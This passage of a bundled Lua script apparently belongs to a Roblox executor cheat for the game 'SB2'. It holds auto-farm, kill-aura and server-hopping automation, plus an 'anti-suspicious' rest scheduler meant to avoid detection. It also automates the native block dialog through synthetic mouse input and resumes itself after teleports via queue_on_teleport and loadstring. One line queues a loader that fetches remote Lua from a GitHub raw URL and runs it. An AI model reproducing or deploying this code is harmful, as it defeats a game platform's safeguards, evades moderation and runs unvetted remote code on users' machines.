        if not state.Running or type(features)~="table"then return end
        local setters={AutoFarm=state.SetAutoFarm,Enabled=state.SetEnabled,SkillAura=state.SetSkillAura}
        for _,name in ipairs({"AutoFarm","Enabled","SkillAura"})do
            if type(features[name])=="boolean"then setters[name](features[name])end
        end
    end
    local function allowed(person)return person==player or state.SafeWhitelistIds[tostring(person.UserId)]==true end
    local function others()
        local result={}
        for _,person in ipairs(Players:GetPlayers())do if person~=player then result[#result+1]=person end end
        return result
    end
    local function save(ticket)
        if state.StorageBootstrap then local ready,reason=state.StorageBootstrap.Ensure(true);assert(ready,reason)end
        writefile(path,HttpService:JSONEncode(ticket));return true
    end
    local function readTicket()
        if typeof(isfile)~="function"or typeof(readfile)~="function"or not isfile(path)then return nil end
        local source=readfile(path)
        assert(#source<16384,"Solo-search state exceeds its size limit")
        return HttpService:JSONDecode(source)
    end
    local nativeBlockedEvents,blockEventsBound={},false
    local function bindBlockEvents()
        if blockEventsBound then return end
        local blocked,added=pcall(StarterGui.GetCore,StarterGui,"PlayerBlockedEvent")
        local unblocked,removed=pcall(StarterGui.GetCore,StarterGui,"PlayerUnblockedEvent")
        if not blocked or not unblocked then return end
        local function identity(value)return typeof(value)=="Instance"and value.UserId or tonumber(value)end
        ctx.Bind(added.Event,function(value)local id=identity(value);if id then nativeBlockedEvents[id]=true end end)
        ctx.Bind(removed.Event,function(value)local id=identity(value);if id then nativeBlockedEvents[id]=nil end end)
        blockEventsBound=true
    end
    local function getBlocked()
        bindBlockEvents()
        local values=StarterGui:GetCore("GetBlockedUserIds")
        assert(type(values)=="table","Blocked-user list is unavailable")
        local membership={}
        for _,value in ipairs(values)do membership[tonumber(value)]=true end
        for id in pairs(nativeBlockedEvents)do membership[id]=true end
        return membership
    end
    local function queuePreflight()
        if state.StorageBootstrap then local ready,reason=state.StorageBootstrap.Ensure();assert(ready,reason)end
        assert(typeof(readfile)=="function"and typeof(writefile)=="function"and typeof(isfile)=="function",
            "File access is required to resume after rejoining")
        queue=queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport)or (fluxus and fluxus.queue_on_teleport)
        assert(typeof(queue)=="function","This executor has no queue_on_teleport support")
        local location=state.SavedScriptPath
        assert(isfile(location),"Automatic source installation failed: "..location)
        local generation=state.StorageBootstrap and state.StorageBootstrap.Generation or 0
        if validatedSource and validatedPath==location and validatedGeneration==generation then return end
        local source=readfile(location)
        assert(source:find(state.Build,1,true)and source:find("-- BEGIN BUNDLED SERVER ISOLATION",1,true),
            "The executor's saved script could not be refreshed automatically")
        if source~=validatedSource then
            assert(loadstring(source),"The saved script does not compile")
            validatedSource=source
        end
        savedSource=source;validatedPath=location;validatedGeneration=generation
    end
    local function preflight()
        queuePreflight()
        assert(virtualInput and typeof(virtualInput.SendMouseButtonEvent)=="function","Automatic prompt input is unavailable")
        getBlocked()
        if not isfile(path)then save({Version=1,Active=false})end
    end
    local function findPrompt(target)
        local core=game:GetService("CoreGui")
        assert(core,"The search worker cannot access Roblox's block dialog")
        for _,overlay in ipairs(core:GetChildren())do
            if overlay.Name=="FoundationOverlay"and overlay:IsA("ScreenGui")and overlay.Enabled then
                for _,title in ipairs(overlay:QueryDescendants("TextLabel"))do
                    if title.Name=="Title"and title.Visible then
                        local contents=title.Parent and title.Parent.Parent and title.Parent.Parent.Parent
                        local modal=contents and contents.Parent
                        if contents and contents.Name=="AlertContents"and modal and modal.Name=="AlertModal"
                            and modal.Parent and modal.Parent.Name=="BlockingModal"then
                            local footer=contents:FindFirstChild("Footer")
                            local buttons=footer and footer:FindFirstChild("Buttons")
                            local confirm=buttons and buttons:FindFirstChild("3")
                            local cancel=buttons and buttons:FindFirstChild("1")
                            local report=buttons and buttons:FindFirstChild("2")
                            local matches=title.Text:find(target.DisplayName,1,true)or title.Text:find(target.Name,1,true)
                            local supported=confirm and cancel and report and confirm:IsA("GuiButton")
                                and confirm.LayoutOrder==0 and cancel.LayoutOrder==2 and report.LayoutOrder==1
                            assert(matches and supported,"Another or unsupported Roblox block dialog is open")
                            return confirm,cancel
                        end
                    end
                end
            end
        end
    end
    local function click(button)
        assert(button.Visible and button.Active and button.AbsoluteSize.X>0,"Block dialog is not ready")
        local point=blockPoint(button,GuiService:GetGuiInset())
        virtualInput:SendMouseMoveEvent(point.X,point.Y,game)
        virtualInput:SendMouseButtonEvent(point.X,point.Y,0,true,game,0)
        task.wait(.03)
        virtualInput:SendMouseButtonEvent(point.X,point.Y,0,false,game,0)
    end
    local function directBlock(target,active)
        local button,cancel=findPrompt(target)
        if not active()then return false end
        if not button then StarterGui:SetCore("PromptBlockPlayer",target)end
        local deadline=os.clock()+8
        repeat
            button,cancel=findPrompt(target)
            if not active()then if cancel then click(cancel)end;return false end
            if button then break end
            task.wait(.05)
        until os.clock()>=deadline
        assert(button,"Roblox block dialog did not open; no rejoin attempted")
        if not active()then if cancel then click(cancel)end;return false end
        click(button)
        local receipt
        deadline=os.clock()+10
        repeat
            if not active()then return false end
            if getBlocked()[target.UserId]then
                receipt=receipt or os.clock()
                if os.clock()-receipt>=math.clamp((state.PingMs or 100)/1000+.05,.15,.75)then return true end
            else receipt=nil end
            task.wait(.05)
        until os.clock()>=deadline
        error("Roblox did not confirm the block; no rejoin attempted")
    end
    local block=directBlock
    if ctx.MakeBlockConfirm then
        block=ctx.MakeBlockConfirm({Find=findPrompt,Prompt=function(target)StarterGui:SetCore("PromptBlockPlayer",target)end,
            Ready=function(button)return button.Visible and button.Active and button.AbsoluteSize.X>0 end,
            Key=function(button)return tostring(button.AbsolutePosition).."/"..tostring(button.AbsoluteSize)end,
            Click=click,Now=os.clock,Sleep=task.wait,
            Blocked=function(target)return nativeBlockedEvents[target.UserId]==true or getBlocked()[target.UserId]==true end,
            Settle=function()return 0 end})
    end
    local blockBusy=false
    local blockMask=ctx.MakeBlockMask and ctx.MakeBlockMask({Root=game:GetService("CoreGui"),Render=game:GetService("RunService").PreRender})
    state.BlockDialogMask=blockMask
    local function performBlock(target,active)
        local expires=os.clock()+10
        repeat
            if not active()then return false end
            if not blockBusy then break end
            assert(os.clock()<expires,"Another native block confirmation is still active")
            task.wait(.04)
        until false
        blockBusy=true
        local sent,result=pcall(function()
            if blockMask then blockMask.Begin()end
            return block(target,active)
        end)
        if blockMask then
            if not sent or result~=true then pcall(function()local _,cancel=findPrompt(target);if cancel then click(cancel)end end)end
            task.wait(.1)
            local restored,reason=pcall(blockMask.End)
            if not restored then state.LastBlockMaskError=tostring(reason)end
        end
        blockBusy=false
        if not sent then error(result)end
        return result==true
    end
    function state.BlockPlayerNative(target,active)
        workerIdentity()
        if not active()then return false end
        if getBlocked()[target.UserId]then return true end
        assert(virtualInput and typeof(virtualInput.SendMouseButtonEvent)=="function","Automatic block confirmation input is unavailable")
        return performBlock(target,active)
    end
    local queuedToken
    function state.QueueAutomation()
        if queuedToken==state.AutomationRunId and queuedToken then return end
        queuePreflight()
        local runId=state.AutomationRunId or HttpService:GenerateGUID(false)
        state.AutomationRunId=runId;state.AutomationResumeFeatures=snapshot()
        assert(state.SaveNow(),"Could not save automation settings")
        local code=string.format([[
if not game:IsLoaded()then game.Loaded:Wait()end
local Players=game:GetService("Players")
local player=Players.LocalPlayer
while not player do task.wait();player=Players.LocalPlayer end
local HttpService=game:GetService("HttpService")
local valid,settings=pcall(function()return HttpService:JSONDecode(readfile(%q))end)
if valid and type(settings)=="table"and settings.AutomationRunId==%q
    and (settings.SafeMode or settings.MultiSpot or settings.AccountProgression or settings.AutoCreateBetween)and game.GameId==%s then
    local active=getgenv().SB2KillAura
    if not(active and active.Running and active.AutomationLoadedJob==game.JobId and active.AutomationRunId==settings.AutomationRunId)then
        local source=readfile(%q)
        if source:find(%q,1,true)then
            getgenv().SB2AutomationResumeFeatures=settings.AutomationResumeFeatures
            local ok,ticket=pcall(function()return HttpService:JSONDecode(readfile(%q))end)
            if ok and type(ticket)=="table"and ticket.Active==true and ticket.UserId==player.UserId and ticket.PlaceId==game.PlaceId then
                getgenv().SB2SoloResumeTicket=ticket
            end
            assert(loadstring(source))()
        end
    end
end
]],state.ConfigPath,runId,tostring(game.GameId),state.SavedScriptPath,state.Build,path)
        queue(code);queuedToken=runId
    end
    local function clearRejoinAway()
        state.SafeRejoinRequested=false;state.SafeRejoinAway=nil;state.SafeRejoinDispatch=nil;state.ServerTeleportStarted=false
    end
    local function fail(reason)
        clearRejoinAway();state.AutomationTeleporting=false
        if state.SoloServerSearch and state.SoloServerSearch.Active then state.SoloServerSearch.Stop("Automation stopped")end
        if state.MultiSpotController then state.MultiSpotController.Pause(tostring(reason))end
        if state.AccountProgression and state.ProgressionController then state.ProgressionController.Pause(reason)end
        if state.SafeMode and state.SafeController then state.SafeController.Pause(reason)
        elseif state.ReleaseSafePanic then state.ReleaseSafePanic()end
        state.SafeModeStatus=tostring(reason);state.MultiSpotStatus=tostring(reason)
        state.SaveNow();refresh()
    end
    function state.ChangeAutomationFloor(placeId)
        if state.AutomationTeleporting then return true end
        local floor=catalog.FloorById[placeId]
        if not floor or not state.IsAutomationFloorUnlocked(placeId)then
            local reason="Selected floor is locked or unavailable"
            state.LastFloorTravelError=reason;fail(reason);return false,reason
        end
        local progression=state.AccountProgression==true
        state.FloorTravelAttempt=0
        local sent,reason=pcall(function()
            assert(state.PanicToSpawn(),"Wait for a living character at the teleport pad")
            state.QueueAutomation();state.AutomationTeleporting=true;state.AutomationTeleportDeadline=os.clock()+45
            local attempt=1
            repeat
                task.wait(math.clamp((state.PingMs or 100)/1000+.25,.5,1))
                assert(state.Running and not state.StopEverything and state.AutomationTeleporting,"Floor travel cancelled")
                assert(not progression or state.AccountProgression,"Account Progression stopped")
                assert(state.PanicToSpawn(),"Wait for a living character at the teleport pad")
                state.FloorTravelAttempt=attempt
                local reply=game.ReplicatedStorage.Function:InvokeServer("Teleport",{"Teleport",placeId})
                if reply==nil or reply==""then return end
                if attempt==2 then error(tostring(reply))end
                attempt=attempt+1
            until attempt>2
        end)
        state.LastFloorTravelError=not sent and tostring(reason)or nil
        if not sent then fail(reason)end
        return sent,state.LastFloorTravelError
    end
    local kickFallback,restTracker
    if ctx.MakeRest then
        local path="SB2Codex/anti-suspicious_"..player.UserId..".json"
        local function integer(value,fallback,maximum)
            return type(value)=="number" and value==value and math.clamp(math.round(value),1,maximum)or fallback
        end
        local limits=state.AntiSuspiciousLimits or {}
        state.AntiSuspiciousLimits=limits
        limits.Hops=integer(limits.Hops,10,100);limits.Window=integer(limits.Window,10,200)
        limits.Min=integer(limits.Min,40,200);limits.Max=math.max(limits.Min,integer(limits.Max,60,200))
        function state.SetAntiSuspicious(value)
            state.AntiSuspicious=value==true
            ctx.SavePreferences()
        end
        function state.SetAntiSuspiciousLimit(key,value,maximum)
            if key=="Hops"then limits.Hops=integer(value,limits.Hops,100)
            elseif key=="Window"then limits.Window=integer(value,limits.Window,200)
            elseif key=="Rest"then
                limits.Min=integer(value,limits.Min,200)
                limits.Max=math.max(limits.Min,integer(maximum,limits.Max,200))
            else return end
            ctx.SavePreferences()
        end
        restTracker=ctx.MakeRest({Now=os.time,Random=math.random,Enabled=function()return state.AntiSuspicious end,
            Limits=function()return limits end,
            Load=function()
                if type(isfile)~="function" or not isfile(path)then return end
                local bytes=readfile(path)
                if #bytes<8192 then return HttpService:JSONDecode(bytes)end
            end,
            Save=function(ledger)
                if state.StorageBootstrap then local ready,reason=state.StorageBootstrap.Ensure(true);assert(ready,reason)end
                writefile(path,HttpService:JSONEncode(ledger))
            end})
        state.AntiSuspiciousRestUntil=restTracker.Deadline()
    end
    local api=ctx.Make({UserId=player.UserId,PlaceId=game.PlaceId,JobId=game.JobId,Now=os.time,Clock=os.clock,
        SettleSeconds=0,SoloSeconds=.3,BlockSettleSeconds=0,NewId=function()return HttpService:GenerateGUID(false)end,
        Random=function(count)return math.random(1,count)end,Preflight=preflight,Save=save,GetBlocked=getBlocked,
        SnapshotSettings=snapshot,RestoreSettings=restoreFeatures,GetPlayers=others,IsAllowed=allowed,IsFriend=function()return false end,
        ChooseTarget=function(people)
            for _,person in ipairs(people)do if person.UserId==state.SafePendingUserId then return person end end
            return people[math.random(1,#people)]
        end,IsPresent=function(person)return person.Parent==Players end,
        Block=function(person,active)
            local before=os.clock();local confirmed=performBlock(person,active)
            state.LastSafeBlockSeconds=os.clock()-before
            local search=state.SoloServerSearch
            if search and search.Ticket then search.Ticket.LastBlockSeconds=state.LastSafeBlockSeconds end
            return confirmed
        end,
        Queue=function()state.QueueAutomation()end,
        Hop=function()
            local ticket=state.SoloServerSearch and state.SoloServerSearch.Ticket
            local rest=kickFallback and restTracker and restTracker.Departure()
            if inBetween or rest then
                assert(kickFallback and ticket and ticket.LastBlockedUserId,"Confirmed-block rejoin unavailable")
                state.ServerTeleportStarted=false
                kickFallback.Requested(ticket.LastBlockedUserId,rest)
                return
            end
            state.AutomationTeleporting=true;state.AutomationTeleportDeadline=os.clock()+40;state.SafeRejoinRequested=true
            state.ServerTeleportStarted=false
            if kickFallback and ticket then kickFallback.Requested(ticket.LastBlockedUserId)end
            local ok,reason=pcall(function()TeleportService:Teleport(game.PlaceId,player)end)
            if not ok then clearRejoinAway();error(reason)end
        end,
        Notify=function(search)
            state.SoloServerStatus=search.Status
            if state.SafeMode then state.SafeModeStatus=search.Status end
            refresh()
        end})
    state.SoloServerSearch=api
    local safe=ctx.MakeSafe({State=state,Search=api,CurrentFloor=function()return game.PlaceId end,
        Suspended=function()
            if state.AntiSuspiciousRestUntil then return true end
            if not waitingForBetween()then return false end
            if state.SafeMode and not state.SafeWhitelistResolving then state.SafeModeStatus="Waiting to enter The Between through a room"end
            return true
        end,
        TargetFloor=function()return (inBetween or state.AccountProgression) and game.PlaceId or state.SafeFloorId end,
        Players=others,Allowed=allowed,ChangeFloor=state.ChangeAutomationFloor,
        Panic=function()
            if inBetween then return end
            if state.PanicInPlace then state.PanicInPlace()else state.PanicToSpawn()end
        end,
        Protected=function()if restTracker then restTracker.ObserveProtected()end end,
        ReleasePanic=function()state.ReleaseSafePanic()end,Travelling=function()return state.AutomationTeleporting or state.TravelBusy end,
        Status=function(message)state.SafeModeStatus=message end,Save=state.SaveNow})
    state.SafeController=safe
    local multi=ctx.MakeMulti({State=state,Respawns=state.MultiSpotRespawns,Spots=function()return catalog.Spots end,
        PriorityTarget=function()return state.GetFarmPriorityTarget and state.GetFarmPriorityTarget(os.clock())end,
        DepartureReady=function()return not state.FarmCoordination or state.FarmCoordination.Ready("spot")end,
        Suspend=function()
            state.MultiSpotPriorityActive=true
            if state.MultiSpotOwnsTravel and state.TravelBusy then state.TravelSerial=(state.TravelSerial or 0)+1;state.TravelBusy=false end
            state.MultiSpotOwnsTravel=false;state.MultiSpotTravelPending=false;state.MultiSpotLandingPosition=nil;state.MultiSpotEmptySince=nil
            state.TravelHold=false;state.TravelHoldPosition=nil
            if state.ArenaFloat then state.ArenaFloat.Release()end
        end,
        Resume=function()state.MultiSpotPriorityActive=false end,CurrentFloor=function()return game.PlaceId end,ChangeFloor=state.ChangeAutomationFloor,
        CanMove=function()
            if os.clock()<(state.AtheonUnlockPauseUntil or 0)then return false end
            if state.IsFarmEnemyAlive and state.IsFarmEnemyAlive()then return false end
            if not state.AutoFarm or state.AutoTradeBusy or state.AccountProgression or state.ModeratorBlocking then return false end
            local character=player.Character
            local root=character and character:FindFirstChild("HumanoidRootPart")
            local humanoid=character and character:FindFirstChildOfClass("Humanoid")
            if not root or root.Anchored or not humanoid or humanoid.Health<=0 then return false end
            return not(state.AutomationTeleporting or state.SafeModePanic or api.Active or state.SafeMode and safe.Seeking
                or state.TravelBusy or state.Dodging or state.Recovering)
        end,
        Moving=function()return state.TravelBusy end,
        Arrived=function(spot)
            state.MultiSpotOwnsTravel=false
            local root=player.Character and player.Character:FindFirstChild("HumanoidRootPart")
            local position=state.LastTravelPosition
            local arrived=spot and root and position and state.LastTravelDestination==spot.DestinationId and (root.Position-position).Magnitude<=25
            if arrived and state.FinishMultiSpotArrival then state.FinishMultiSpotArrival()end
            return arrived
        end,
        Go=function(spot,resume)
            if state.TravelBusy then return false end
            state.RegisterAutomationDestination(spot);state.MultiSpotEmptySince=nil;state.MultiSpotAnchor=spot.Position
            state.MultiSpotEncounter=resume and state.MultiSpotEncounter or {};state.MultiSpotNextScan=0
            state.FollowTarget=nil;state.LastTravelDestination=nil;state.MultiSpotOwnsTravel=true
            return state.TeleportToDestination(spot.DestinationId,false,true)
        end,
        Encounter=function(spot)return state.ReadAutomationEncounter(spot)end,
        ClearEncounter=function()state.MultiSpotEncounter={};state.MultiSpotNextScan=0 end,
        Release=function()
            if state.ArenaFloat then state.ArenaFloat.Release()end
            if state.MultiSpotOwnsTravel and state.TravelBusy then state.TravelSerial=(state.TravelSerial or 0)+1;state.TravelBusy=false end
            state.MultiSpotPriorityActive=false;state.MultiSpotEmptySince=nil;state.MultiSpotOwnsTravel=false
            state.MultiSpotAnchor=nil;state.MultiSpotEncounter=nil;state.MultiSpotNextScan=0
            state.MultiSpotTravelPending=false;state.MultiSpotLandingPosition=nil
        end,Status=function(message)state.MultiSpotStatus=message end,Save=state.SaveNow})
    state.MultiSpotController=multi
    local function ensureToken()
        if state.SafeMode or state.MultiSpot or state.AccountProgression then return end
        state.AutomationRunId=HttpService:GenerateGUID(false);queuedToken=nil
    end
    function state.SetSafeMode(on)
        if state.SafeKickFallback then state.SafeKickFallback.Reset()end
        ensureToken();safe.Reset();state.SafeMode=on==true
        if not state.SafeMode then state.ReleaseSafePanic()end
        state.SafeModeStatus=state.SafeMode and "Checking selected floor..."or "Safe Mode is off"
        state.SafePendingUserId=nil;state.SaveNow();refresh()
        if state.SafeMode then task.defer(function()workerIdentity();safe.Update();refresh()end)end
    end
    state.SetSoloServerSearch=state.SetSafeMode
    function state.SetSafeFloor(id)
        if state.AccountProgression then
            state.SafeFloorId=game.PlaceId;state.SafeModeStatus="Account Progression · protecting the current floor"
            state.SaveNow();refresh();return false
        end
        local floor=catalog.FloorById[tonumber(id)]
        if not floor or not state.IsAutomationFloorUnlocked(floor.Id)then state.SafeModeStatus="That floor is locked";refresh();return false end
        safe.Reset();multi.Reset();state.SafeFloorId=floor.Id;state.SharedSafeFloorId=floor.Id
        state.SaveNow();refresh()
        if state.SafeMode and not state.AntiSuspiciousRestUntil then
            if waitingForBetween()then
                if state.SafeKickFallback then state.SafeKickFallback.Reset()end
                state.ReleaseSafePanic()
            elseif not inBetween then state.PanicToSpawn()end
            task.defer(function()workerIdentity();safe.Update();refresh()end)
        end
        return true
    end
    local whitelistGeneration=0
    function state.SetSafeWhitelist(text)
        local entries,used={},{}
        for value in tostring(text or ""):gsub("[^%w_]"," "):gmatch("%S+")do
            if not used[value:lower()]then used[value:lower()]=true;entries[#entries+1]=value end
        end
        text=table.concat(entries,", ")
        if #text>2000 then state.SafeModeStatus="Whitelist is too long";refresh();return false end
        whitelistGeneration=whitelistGeneration+1
        local token=whitelistGeneration
        safe.Reset();state.SafeWhitelistResolving=true
        task.delay(12,function()
            if token~=whitelistGeneration or not state.Running or not state.SafeWhitelistResolving then return end
            whitelistGeneration=whitelistGeneration+1;state.SafeWhitelistResolving=false
            state.SafeModeStatus="Whitelist lookup timed out · using the saved whitelist";refresh()
        end)
        task.spawn(function()
            local membership={}
            local ok,reason=pcall(function()
                assert(#entries<=100,"Use at most 100 whitelist entries")
                for _,name in ipairs(entries)do
                    local id=tonumber(name)or Players:GetUserIdFromNameAsync(name)
                    assert(id and id>0 and id%1==0,"Invalid whitelist user: "..name)
                    membership[tostring(id)]=true
                end
            end)
            if token~=whitelistGeneration or not state.Running then return end
            state.SafeWhitelistResolving=false
            if not ok then state.SafeModeStatus="Whitelist was not saved: "..tostring(reason);refresh();return end
            state.SafeWhitelistIds=membership;state.SafeWhitelistText=text;safe.Reset()
            if state.UI.SafeWhitelist and not state.UI.SafeWhitelist:IsFocused()then state.UI.SafeWhitelist.Text=text end
            state.SafeModeStatus=state.SafeMode and "Whitelist updated · checking server"or "Whitelist saved"
            state.SaveNow();refresh()
            if state.SafeMode then workerIdentity();safe.Update();refresh()end
        end)
        return true
    end
    function state.SetMultiSpot(on)
        ensureToken();multi.Reset();state.MultiSpot=on==true
        state.MultiSpotStatus=state.MultiSpot and "Starting selected arenas..."or "Multi Spot is off"
        state.SaveNow();refresh()
        if state.MultiSpot and not state.AccountProgression then task.defer(function()workerIdentity();multi.Update(farmClock());refresh()end)end
    end
    local function spotOrder(selected,requested)
        local order,membership={},{}
        local function append(id)
            local canonical=catalog.Aliases[id]or id
            if selected[canonical]and not membership[canonical]then order[#order+1]=canonical;membership[canonical]=true end
        end
        for _,id in ipairs(state.MultiSpotOrder)do
            local spot=catalog.SpotById[id]
            if spot and spot.PlaceId~=game.PlaceId then append(id)end
        end
        for _,id in ipairs(requested or {})do append(id)end
        for _,id in ipairs(state.MultiSpotOrder)do append(id)end
        for _,spot in ipairs(catalog.Spots)do append(spot.Id)end
        return order
    end
    function state.SetMultiSpotSelection(id,on)
        local key=catalog.Aliases[id]or id
        local spot=catalog.SpotById[key]
        if not spot or not state.IsAutomationFloorUnlocked(spot.PlaceId)then state.MultiSpotStatus="That arena's floor is locked";refresh();return false end
        state.MultiSpotSelected[key]=on==true or nil;state.MultiSpotOrder=spotOrder(state.MultiSpotSelected)
        multi.Reset();state.SaveNow();refresh();return true
    end
    function state.SetMultiSpotSelections(selected,order)
        local nextSelection=table.clone(state.MultiSpotSelected)
        for id in pairs(nextSelection)do
            local spot=catalog.SpotById[id]
            if spot and spot.PlaceId==game.PlaceId then nextSelection[id]=nil end
        end
        for id,on in pairs(selected or {})do
            if on then
                local spot=catalog.SpotById[catalog.Aliases[id]or id]
                if not spot or spot.PlaceId~=game.PlaceId or not state.IsAutomationFloorUnlocked(spot.PlaceId)then return false end
                nextSelection[spot.Id]=true
            end
        end
        state.MultiSpotOrder=spotOrder(nextSelection,order);state.MultiSpotSelected=nextSelection
        multi.Reset();state.SaveNow();refresh();return true
    end
    local function joinFriendAtPad(id,active)
        state.AutoJoinFriendHolding=true
        local function permitted()return active()and not api.Active and not(state.SafeMode and safe.Seeking)end
        local ok,result=pcall(function()
            local attempt=1
            repeat
                assert(permitted(),"Friend join cancelled for protection or travel")
                assert(state.PanicToSpawn(),"Wait for a living character at the teleport pad")
                task.wait(math.clamp((state.PingMs or 100)/1000+.25,.5,1))
                assert(permitted(),"Friend join cancelled for protection or travel")
                assert(state.PanicToSpawn(),"Teleport pad is unavailable")
                local reply=game.ReplicatedStorage.Function:InvokeServer("Teleport",{"FriendTeleport",id})
                if reply==nil or reply==""then
                    local expires=os.clock()+5
                    repeat task.wait(.1)until not permitted()or state.ServerTeleportStarted or os.clock()>=expires
                    return reply
                end
                if attempt==2 or not tostring(reply):lower():find("teleport pad",1,true)then return reply end
                attempt=attempt+1
            until attempt>2
        end)
        state.AutoJoinFriendHolding=false
        if state.Running and not state.ModeratorBlocking and not api.Active and not(state.SafeMode and safe.Seeking)then state.ReleaseSafePanic()end
        if not ok then error(result)end
        return result
    end
    local friend=ctx.MakeFriend({State=state,LocalUserId=player.UserId,Spawn=task.spawn,
        Resolve=function(name)return Players:GetUserIdFromNameAsync(name)end,Present=function(id)return Players:GetPlayerByUserId(id)~=nil end,
        Queue=function()
            local enqueue=queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport)or (fluxus and fluxus.queue_on_teleport)
            assert(type(enqueue)=="function","Executor has no teleport queue support")
            state.SaveNow();enqueue('loadstring(game:HttpGet("https://raw.githubusercontent.com/AttackerDestiny/balls/main/loader.luau"))()')
        end,Join=joinFriendAtPad})
    state.AutoJoinFriendController=friend
    function state.SetAutoJoinFriend(on)state.AutoJoinFriend=on==true;friend.Reset();state.SaveNow();refresh()end
    function state.SetJoinFriendUsername(name)
        state.JoinFriendUsername=tostring(name or ""):match("^%s*(.-)%s*$"):gsub("^@",""):sub(1,20)
        friend.Reset();state.SaveNow();refresh()
    end
    ui=ctx.MakeUI({State=state,Catalog=catalog,Create=ctx.Create,Button=ctx.Button,Label=ctx.Label,
        Bind=ctx.Bind,Corner=ctx.Corner,Reveal=ctx.Reveal,Parent=ctx.Parent})
    ctx.Bind(Players.PlayerAdded,function(person)
        safe.Joined(person)
        task.defer(function()workerIdentity();if state.Running then safe.Update();refresh()end end)
    end)
    ctx.Bind(TeleportService.TeleportInitFailed,function(who,result,reason)
        if who==player then
            local requested=state.SafeRejoinRequested
            state.AutomationTeleporting=false;api.TeleportFailed(reason or result.Name);fail(reason or result.Name)
            if requested and kickFallback then kickFallback.TeleportFailed()end
        end
    end)
    local function fallbackTicket(rest)
        local ticket=api.Ticket
        if not ticket then
            local ok,value=pcall(readTicket)
            if ok and type(value)=="table"and type(value.RunId)=="string"then ticket=value end
        end
        if ticket then
            assert(ticket.UserId==player.UserId and ticket.PlaceId==game.PlaceId,"Saved search scope mismatch · no fallback kick")
            assert(type(ticket.StartedAt)=="number"and os.time()-ticket.StartedAt<900
                and type(ticket.Hops)=="number"and ticket.Hops<((inBetween or rest) and 13 or 12),"Safe Mode search limit reached · no fallback kick")
        end
        return ticket
    end
    if ctx.MakeKickFallback then
        kickFallback=ctx.MakeKickFallback({InitialJob=game.JobId,Job=function()return game.JobId end,Now=os.clock,
            WallTime=os.time,CommitRest=function(seconds)
                local untilAt=restTracker.Commit(seconds)
                state.AntiSuspiciousRestUntil=untilAt
                return untilAt
            end,
            Active=function()return state.Running and state.SafeMode and not waitingForBetween()and not state.StopEverything and not state.ModeratorBlocking and not state.SafeWhitelistResolving end,
            Players=others,Allowed=allowed,Present=function(person)return person.Parent==Players end,Spawn=task.spawn,Sleep=task.wait,CheckLimits=fallbackTicket,
            Started=function()return state.ServerTeleportStarted==true end,
            Pause=function()
                workerIdentity();state.SafeKickFallbackBusy=true;api.Destroy(true)
                if not inBetween then
                    if state.PanicInPlace then state.PanicInPlace()else state.PanicToSpawn()end
                end
            end,
            Block=function(person,active)return state.BlockPlayerNative(person,active)end,
            Prepare=function(person,rest)
                local ticket=fallbackTicket(rest)or {Version=1,UserId=player.UserId,PlaceId=game.PlaceId,
                    RunId=HttpService:GenerateGUID(false),StartedAt=os.time(),Hops=0,Visited={},Added={}}
                assert(os.time()-ticket.StartedAt<900 and ticket.Hops<((inBetween or rest) and 13 or 12),"Safe Mode search limit reached · no kick")
                ticket.SameServerReturns=math.min(ticket.SameServerReturns or 0,3)
                ticket.Active=true;ticket.SourceJob=game.JobId;ticket.Visited[game.JobId]=true
                ticket.LastBlockedUserId=person.UserId;save(ticket);state.QueueAutomation()
            end,
            Rejoin=function()workerIdentity();TeleportService:Teleport(game.PlaceId,player)end,Kick=function(reason)player:Kick(reason)end,
            Finish=function()state.SafeKickFallbackBusy=false end,Status=function(message)state.SafeModeStatus=message;refresh()end})
        state.SafeKickFallback=kickFallback
    end
    ctx.Bind(player.OnTeleport,function(stage)
        if stage==Enum.TeleportState.Started or stage==Enum.TeleportState.InProgress then
            state.ServerTeleportStarted=true
            if kickFallback then kickFallback.MarkStarted()end
            if state.SafeMode or state.MultiSpot or state.AccountProgression or state.AutoCreateBetween then local ok,reason=pcall(state.QueueAutomation);if not ok then fail(reason)end end
        elseif stage==Enum.TeleportState.Failed then
            local requested=state.SafeRejoinRequested
            clearRejoinAway();state.AutomationTeleporting=false
            if requested and kickFallback then kickFallback.TeleportFailed()end
        end
    end)
    state.AutomationLoadedJob=game.JobId
    task.spawn(function()
        workerIdentity()
        local resumeFeatures=getgenv().SB2AutomationResumeFeatures;getgenv().SB2AutomationResumeFeatures=nil
        if resumeFeatures then restoreFeatures(resumeFeatures)end
        local ok,resume=pcall(readTicket)
        if queuedResume then ok,resume=true,queuedResume end
        local resumeAllowed=not state.AntiSuspiciousRestUntil and not state.ModeratorBlocking and state.SafeMode
            and (inBetween or state.AccountProgression or state.SafeFloorId==game.PlaceId)
        if resumeAllowed and ok and type(resume)=="table"and resume.Active==true and resume.PlaceId==game.PlaceId then
            api.Start(resume);if safe.AdoptSearch then safe.AdoptSearch()end
        end
        state.SaveNow()
        while state.Running do
            if state.AutomationTeleporting and os.clock()>state.AutomationTeleportDeadline then fail("Floor teleport timed out")end
            local updated,reason=pcall(function()
                if state.AntiSuspiciousRestUntil then
                    if os.time()<state.AntiSuspiciousRestUntil or kickFallback and kickFallback.Armed then return end
                    state.AntiSuspiciousRestUntil=nil
                end
                if state.ModeratorBlocking or state.SafeKickFallbackBusy or kickFallback and kickFallback.Armed then return end
                if inBetween then safe.Update();return end
                friend.Update(os.clock());safe.Update()
                if state.AccountProgression then
                    if state.ProgressionController then state.ProgressionController.Update(os.clock())end
                else multi.Update(farmClock())end
            end)
            if not updated then fail(reason)end
            refresh()
            local interval=1
            if api.Active or state.SafeModePanic then interval=.03
            elseif state.MultiSpot or state.AccountProgression then interval=.1
            elseif state.SafeMode then interval=.2 end
            task.wait(interval)
        end
    end)
    task.spawn(function()
        while state.Running do
            if kickFallback then pcall(kickFallback.Update,os.clock())end
            if not state.SafeKickFallbackBusy and not(kickFallback and kickFallback.Armed)and safe.ObserveProtected then pcall(safe.ObserveProtected)end
            task.wait(state.SafeMode and .1 or 1)
        end
    end)
    return api
end

-- END BUNDLED SERVER ISOLATION CLIENT
    end)()
    local blockPoint=(function()
-- BEGIN BUNDLED BLOCK INPUT
-- FoundationOverlay's native coordinate space includes the GuiService inset.
return function(button,inset)
    local origin=button.AbsolutePosition
    local half=button.AbsoluteSize/2
    return origin+inset+half
end

-- END BUNDLED BLOCK INPUT
    end)()
    local makeBlockConfirm=(function()
-- BEGIN BUNDLED BLOCK CONFIRM
-- Confirmation is a two-stage native-dialog transaction with an authoritative receipt.
return function(ctx)
    local function cancel(target)
